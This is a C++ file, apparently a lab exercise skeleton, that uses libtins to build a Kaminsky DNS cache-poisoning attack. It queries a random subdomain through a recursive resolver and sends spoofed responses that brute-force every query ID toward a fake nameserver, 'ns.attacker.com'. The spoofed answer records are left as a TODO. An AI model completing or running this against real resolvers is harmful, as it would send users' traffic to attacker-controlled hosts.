#include <iostream>
#include <tins/tins.h>

using namespace Tins;

#define MAX_QUERY_ID 0xffff
#define MIN_QUERY_ID 0x0000

#define VICTIM_IP "192.168.1.2"
#define RECURSIVE_DNS "192.168.1.254"
#define AUTHORITATIVE_DNS "2.2.2.254"
#define COM_DNS "3.3.3.1"
#define ATTACKING_DOMAIN "example.com"
#define ATTACKING_HOST "test.example.com"
#define MALICIOUS_NS "ns.attacker.com"
#define MALICIOUS_NS_IP "1.1.1.254"
#define MALICIOUS_WEBSERVER "1.1.1.3"

std::string generateRandomString(size_t size);

int main() {
    PacketSender sender;
    
    // Generate a random host for the query (xxxxx.example.com)
    std::string queryName = generateRandomString(5);
    queryName.append(".");
    queryName.append(ATTACKING_DOMAIN);

    // Create the DNS query packet to send to the victim
    // That will trigger the recursive requests
    DNS dns_request;
    dns_request.type(DNS::QUERY);
    dns_request.id(1234);
    dns_request.recursion_desired(1);

    // IP of {random}.example.com?
    DNS::query dns_query(queryName, DNS::A, DNS::IN);
    dns_request.add_query(dns_query);

    // Send the packet
    IP query_pkt = IP(RECURSIVE_DNS, VICTIM_IP) / UDP(53, 1234) / dns_request;
    sender.send(query_pkt);

    // Try all possible query IDs
    for(unsigned int query_id = MIN_QUERY_ID; query_id < MAX_QUERY_ID; query_id++) {
        // Send a DNS response to the recursive DNS, coming from <REDACTED>
        DNS dns_response;
        dns_response.type(DNS::RESPONSE);
        dns_response.id(query_id);
        dns_response.add_query(dns_query);

        /*
         * TODO: Fill the DNS answer in order to perform the kaminsky attack
         * Note that the response should say:
         * "FOR example.com ASK ns.attacker.com AT 1.1.1.254"
         */

        IP resp_pkt = IP("???", "???") / UDP(33333, 53) / dns_response;
        sender.send(resp_pkt);
    }
}

std::string generateRandomString(size_t size) {
	const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
	srand(time(NULL));
  
	std::string s;
	s.reserve(size);
  
	for (int i = 0; i < size; ++i) 
		s += charset[rand() % (sizeof(charset) - 1)];
	return s;
}
